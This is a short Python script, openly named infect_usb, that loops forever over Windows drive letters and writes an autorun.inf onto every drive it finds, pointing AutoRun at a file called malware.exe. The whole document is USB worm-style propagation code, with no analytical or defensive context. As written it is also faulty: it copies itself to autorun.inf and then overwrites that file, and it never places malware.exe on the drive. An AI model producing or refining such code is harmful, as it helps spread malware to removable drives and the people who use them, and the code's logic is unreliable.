import os
import shutil
import time

def infect_usb():
    while True:
        drives = [d for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for drive in drives:
            if os.path.exists(f"{drive}:\\"):
                try:
                    shutil.copyfile(__file__, f"{drive}:\\autorun.inf")
                    with open(f"{drive}:\\autorun.inf", "w") as f:
                        f.write("[AutoRun]\nopen=malware.exe\nicon=malware.exe")
                except:
                    pass
        time.sleep(5)

if __name__ == "__main__":
    infect_usb()
